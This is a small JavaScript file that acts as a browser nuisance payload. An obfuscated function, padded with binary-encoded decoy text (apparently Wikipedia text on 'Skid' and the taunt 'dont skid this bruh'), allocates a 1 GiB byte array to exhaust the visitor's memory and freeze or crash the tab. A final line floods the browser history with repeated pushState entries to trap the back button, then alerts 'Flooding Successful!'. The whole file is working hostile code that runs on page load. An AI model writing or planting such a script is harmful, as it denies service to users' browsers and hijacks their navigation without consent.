(function() {
    'use strict';
    var moyai = [8,3,6,1,5,2,9,0,7,4];
    var decodedstring = [moyai[4-1], moyai[8-1*2/2], moyai[8], moyai['01010011 01101011 01101001 01100100 00001010 00001010 01000001 01110010 01110100 01101001 01100011 01101100 01100101 00001010 01010100 01100001 01101100 01101011 00001010 01010010 01100101 01100001 01100100 00001010 01000101 01100100 01101001 01110100 00001010 01010110 01101001 01100101 01110111 00100000 01101000 01101001 01110011 01110100 01101111 01110010 01111001 00001010 00001010 01010100 01101111 01101111 01101100 01110011 00001010 01000110 01110010 01101111 01101101 00100000 01010111 01101001 01101011 01101001 01110000 01100101 01100100 01101001 01100001 00101100 00100000 01110100 01101000 01100101 00100000 01100110 01110010 01100101 01100101 00100000 01100101 01101110 01100011 01111001 01100011 01101100 01101111 01110000 01100101 01100100 01101001 01100001 00001010 00001010 01001100 01101111 01101111 01101011 00100000 01110101 01110000 00100000 01110011 01101011 01101001 01100100 00100000 01101111 01110010 00100000 01110011 01101011 01101001 01100100 01110011 00100000 01101001 01101110 00100000 01010111 01101001 01101011 01110100 01101001 01101111 01101110 01100001 01110010 01111001 00101100 00100000 01110100 01101000 01100101 00100000 01100110 01110010 01100101 01100101 00100000 01100100 01101001 01100011 01110100 01101001 01101111 01101110 01100001 01110010 01111001 00101110 00001010 01010011 01101011 01101001 01100100 00100000 01101111 01110010 00100000 01010011 01101011 01101001 01100100 01110011 00100000 01101101 01100001 01111001 00100000 01110010 01100101 01100110 01100101 01110010 00100000 01110100 01101111 00111010 00001010 00001010 01010011 01101011 01101001 01100100 00101100 00100000 01100001 00100000 01110100 01111001 01110000 01100101 00100000 01101111 01100110 00100000 01110000 01100001 01101100 01101100 01100101 01110100 00001010 01010011 01101011 01101001 01100100 00100000 00101000 01100001 01100101 01110010 01101111 01100100 01111001 01101110 01100001 01101101 01101001 01100011 01110011 00101001 00101100 00100000 01100001 01101110 00100000 01101111 01110101 01110100 01110111 01100001 01110010 01100100 00100000 01110011 01101001 01100100 01100101 00101101 01110011 01101100 01101001 01110000 00100000 01101001 01101110 00100000 01100001 01101110 00100000 01100001 01101001 01110010 01100011 01110010 01100001 01100110 01110100 00100000 01110100 01110101 01110010 01101110 00001010 01010011 01101011 01101001 01100100 00100000 00101000 01100001 01110101 01110100 01101111 01101101 01101111 01100010 01101001 01101100 01100101 00101001 00101100 00100000 01100001 01101110 00100000 01100001 01110101 01110100 01101111 01101101 01101111 01100010 01101001 01101100 01100101 00100000 01101000 01100001 01101110 01100100 01101100 01101001 01101110 01100111 00100000 01100011 01101111 01101110 01100100 01101001 01110100 01101001 01101111 01101110 00100000 01110111 01101000 01100101 01110010 01100101 00100000 01101111 01101110 01100101 00100000 01101111 01110010 00100000 01101101 01101111 01110010 01100101 00100000 01110100 01101001 01110010 01100101 01110011 00100000 01100001 01110010 01100101 00100000 01110011 01101100 01101001 01110000 01110000 01101001 01101110 01100111 00100000 01110010 01100101 01101100 01100001 01110100 01101001 01110110 01100101 00100000 01110100 01101111 00100000 01110100 01101000 01100101 00100000 01110010 01101111 01100001 01100100 00001010 01010011 01101011 01101001 01100100 00101100 00100000 01100001 00100000 01110011 01101100 01100101 01100100 00100000 01110010 01110101 01101110 01101110 01100101 01110010 00001010 01010011 01101011 01101001 01100100 01110011 00101100 00100000 01110110 01100101 01101000 01101001 01100011 01101100 01100101 01110011 00100000 01110111 01101001 01110100 01101000 00100000 01100011 01101111 01101110 01110100 01101001 01101110 01110101 01101111 01110101 01110011 00100000 01110100 01110010 01100001 01100011 01101011 00001010 01010011 01101011 01101001 01100100 01110011 00101100 00100000 01101111 01110010 00100000 01110011 01101011 01101001 01100100 00100000 01101100 01101111 01100001 01100100 01100101 01110010 01110011 00101100 00100000 01100001 00100000 01110110 01100101 01101000 01101001 01100011 01101100 01100101 00001010 01010011 01101011 01101001 01100100 01110011 00101100 00100000 01100001 00100000 01101110 01100001 01110101 01110100 01101001 01100011 01100001 01101100 00100000 01110100 01100101 01110010 01101101 00100000 01100110 01101111 01110010 00100000 01110011 01101100 01101001 01110000 01110111 01100001 01111001 00001010 01001101 01101111 01100100 01110101 01101100 01100001 01110010 00100000 01110000 01110010 01101111 01100011 01100101 01110011 01110011 00100000 01110011 01101011 01101001 01100100 00101100 00100000 01100001 01101110 00100000 01100101 01101110 01100111 01101001 01101110 01100101 01100101 01110010 01100101 01100100 00100000 01100110 01110010 01100001 01101101 01100101 00100000 01100110 01101111 01110010 00100000 01100101 01110001 01110101 01101001 01110000 01101101 01100101 01101110 01110100 00001010 01010011 01101011 01101001 01100100 00101100 00100000 01100001 01101100 01101001 01100001 01110011 00100000 01100110 01101111 01110010 00100000 01110011 01100011 01110010 01101001 01110000 01110100 00100000 01101011 01101001 01100100 01100100 01101001 01100101 00001010 01000011 01101111 01101101 01101001 01100011 01110011 00101100 00100000 01100111 01100001 01101101 01100101 01110011 00100000 01100001 01101110 01100100 00100000 01100001 01101101 01110101 01110011 01100101 01101101 01100101 01101110 01110100 01110011 00001010 01010011 01101011 01101001 01100100 01110011 00100000 00101000 01100011 01101111 01101101 01101001 01100011 01110011 00101001 00101100 00100000 01100011 01101000 01100001 01110010 01100001 01100011 01110100 01100101 01110010 01110011 00100000 01101001 01101110 00100000 01001101 01100001 01110010 01110110 01100101 01101100 00101101 01110000 01110101 01100010 01101100 01101001 01110011 01101000 01100101 01100100 00100000 01100011 01101111 01101101 01101001 01100011 01110011 00001010 01010011 01101011 01101001 01100100 01110011 00100000 00101000 01010100 01110010 01100001 01101110 01110011 01100110 01101111 01110010 01101101 01100101 01110010 01110011 00101001 00101100 00100000 01110011 01100101 01110110 01100101 01110010 01100001 01101100 00100000 01100110 01101001 01100011 01110100 01101001 01101111 01101110 01100001 01101100 00100000 01110010 01101111 01100010 01101111 01110100 00100000 01110011 01110101 01110000 01100101 01110010 01101000 01100101 01110010 01101111 00100000 01100011 01101000 01100001 01110010 01100001 01100011 01110100 01100101 01110010 01110011 00100000 01101001 01101110 00100000 01110100 01101000 01100101 00100000 01010100 01110010 01100001 01101110 01110011 01100110 01101111 01110010 01101101 01100101 01110010 01110011 00100000 01110010 01101111 01100010 01101111 01110100 00100000 01110011 01110101 01110000 01100101 01110010 01101000 01100101 01110010 01101111 00100000 01100110 01110010 01100001 01101110 01100011 01101000 01101001 01110011 01100101 00101110 00001010 01010011 01101011 01101001 01100100 00101100 00100000 01100001 00100000 01110100 01111001 01110000 01100101 00100000 01101111 01100110 00100000 01100001 01101101 01110101 01110011 01100101 01101101 01100101 01101110 01110100 00100000 01110010 01101001 01100100 01100101 00001010 01001101 01110101 01110011 01101001 01100011 00001010 01010011 01101011 01101001 01100100 00100000 00101000 01100001 01101100 01100010 01110101 01101101 00101001 00101100 00100000 00110001 00111001 00110111 00110000 00101100 00100000 01100010 01111001 00100000 01010011 01101011 01101001 01100100 00100000 01010010 01101111 01110111 00001010 01010011 01101011 01101001 01100100 01110011 00100000 00101000 01100010 01100001 01101110 01100100 00101001 00101100 00100000 01100001 00100000 01010011 01100011 01101111 01110100 01110100 01101001 01110011 01101000 00100000 01100010 01100001 01101110 01100100 00001010 01010011 01101011 01101001 01100100 01110011 00100000 00101000 01000101 01010000 00101001 00100000 01100001 00100000 00110001 00111001 00110111 00110111 00100000 01000101 01010000 00100000 01100010 01111001 00100000 01110100 01101000 01100101 00100000 01010011 01100011 01101111 01110100 01110100 01101001 01110011 01101000 00100000 01100010 01100001 01101110 01100100 00001010 01010011 01100101 01100101 00100000 01100001 01101100 01110011 01101111 00001010 01010011 01101011 01101001 01100100 01100100 01100101 01110010 00101100 00100000 01100001 00100000 01110110 01100101 01101000 01101001 01100011 01101100 01100101 00100000 01110101 01110011 01100101 01100100 00100000 01101001 01101110 00100000 01100001 00100000 01101100 01101111 01100111 01100111 01101001 01101110 01100111 00100000 01101111 01110000 01100101 01110010 01100001 01110100 01101001 01101111 01101110 00100000 01100110 01101111 01110010 00100000 01110000 01110101 01101100 01101100 01101001 01101110 01100111 00100000 01100011 01110101 01110100 00100000 01110100 01110010 01100101 01100101 01110011 00100000 01101111 01110101 01110100 00100000 01101111 01100110 00100000 01100001 00100000 01100110 01101111 01110010 01100101 01110011 01110100 00100000 01101001 01101110 00100000 01100001 00100000 01110000 01110010 01101111 01100011 01100101 01110011 01110011 00100000 01100011 01100001 01101100 01101100 01100101 01100100 00100000 00100010 01110011 01101011 01101001 01100100 01100100 01101001 01101110 01100111 00100010 00001010 01000100 01101001 01110011 01100001 01101101 01100010 01101001 01100111 01110101 01100001 01110100 01101001 01101111 01101110 00100000 01101001 01100011 01101111 01101110 00001010 01010100 01101000 01101001 01110011 00100000 01100100 01101001 01110011 01100001 01101101 01100010 01101001 01100111 01110101 01100001 01110100 01101001 01101111 01101110 00100000 01110000 01100001 01100111 01100101 00100000 01101100 01101001 01110011 01110100 01110011 00100000 01100001 01110010 01110100 01101001 01100011 01101100 01100101 01110011 00100000 01100001 01110011 01110011 01101111 01100011 01101001 01100001 01110100 01100101 01100100 00100000 01110111 01101001 01110100 01101000 00100000 01110100 01101000 01100101 00100000 01110100 01101001 01110100 01101100 01100101 00100000 01010011 01101011 01101001 01100100 00101110 00001010 01001001 01100110 00100000 01100001 01101110 00100000 01101001 01101110 01110100 01100101 01110010 01101110 01100001 01101100 00100000 01101100 01101001 01101110 01101011 00100000 01101100 01100101 01100100 00100000 01111001 01101111 01110101 00100000 01101000 01100101 01110010 01100101 00101100 00100000 01111001 01101111 01110101 00100000 01101101 01100001 01111001 00100000 01110111 01101001 01110011 01101000 00100000 01110100 01101111 00100000 01100011 01101000 01100001 01101110 01100111 01100101 00100000 01110100 01101000 01100101 00100000 01101100 01101001 01101110 01101011 00100000 01110100 01101111 00100000 01110000 01101111 01101001 01101110 01110100 00100000 01100100 01101001 01110010 01100101 01100011 01110100 01101100 01111001 00100000 01110100 01101111 00100000 01110100 01101000 01100101 00100000 01101001 01101110 01110100 01100101 01101110 01100100 01100101 01100100 00100000 01100001 01110010 01110100 01101001 01100011 01101100 01100101 00101110 00001010 01000011 01100001 01110100 01100101 01100111 01101111 01110010 01111001 00111010 00100000 01000100 01101001 01110011 01100001 01101101 01100010 01101001 01100111 01110101 01100001 01110100 01101001 01101111 01101110 00100000 01110000 01100001 01100111 01100101 01110011']];
    var _$localerror = ["01100100,01101111,01101110,01110100,00100000,01110011,01101011,01101001,01100100,00100000,01110100,01101000,01101001,01110011,00100000,01100010,01110010,01110101,01101000"];
    const _$Local_MEM = _$DocumentArray8Uint(268435456*4, 31.875*2*2*2);
    function _$DocumentArray8Uint(_$value, _value) {
        new Uint8Array(_$value).fill(_value);
        secure(_$localerror[0][0][1]);
    };
    function secure(x){/**/};
})();
var num=9;done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("Flooding Successful!\n "+window.location.href+" \nIs Now In Your History "+num+(num==1?" time.":" Times."))}
